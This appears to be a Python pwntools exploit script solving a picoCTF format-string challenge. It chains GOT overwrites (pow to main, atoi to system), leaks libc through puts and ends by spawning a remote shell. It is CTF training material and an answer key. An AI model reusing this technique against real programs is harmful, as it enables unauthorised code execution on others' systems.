from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './chall'
HOST = 'mars.picoctf.net'
PORT = 31929

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
	debug(r, [0xa00])
# pre 19
# off 10
def fsb(where, what):
	pre = 19
	payload = ''
	payload += '1'*8
	offset = pre + len(payload)
	for i in range(6):
		c = ((what >> (i*8)) - offset) % 0x100
		if c == 0:
			c = 0x100
		payload += '%{}c%{}$hhn'.format(c, 10+16+i)
		offset += c
	payload = payload.ljust(0x80, 'A')
	for i in range(6):
		payload += p64(where+i)

	return payload


payload = ''
payload += fsb(elf.got.pow, elf.sym.main)
r.sendlineafter('A: ', payload)
r.sendlineafter('B: ', '1')
r.recvuntil('Welcome')

payload = ''
payload += '1'*8
payload += '%12$sAAA'
payload += p64(elf.got.puts)
r.sendlineafter('A: ', payload)
r.sendlineafter('B: ', '1')
r.recvuntil('11111111')
leak = u64(r.recvuntil('AAA', True).ljust(8, '\x00'))
r.recvuntil('Welcome')
dbg('leak')
base = leak - 0x875a0
system = base + 0x55410
payload = ''
payload += fsb(elf.got.atoi, system)
r.sendlineafter('A: ', payload)
r.sendlineafter('B: ', '1')
r.recvuntil('Welcome')
r.sendlineafter('A: ', 'hoge')
r.sendlineafter('B: ', '/bin/sh\x00')


r.interactive()
r.close()
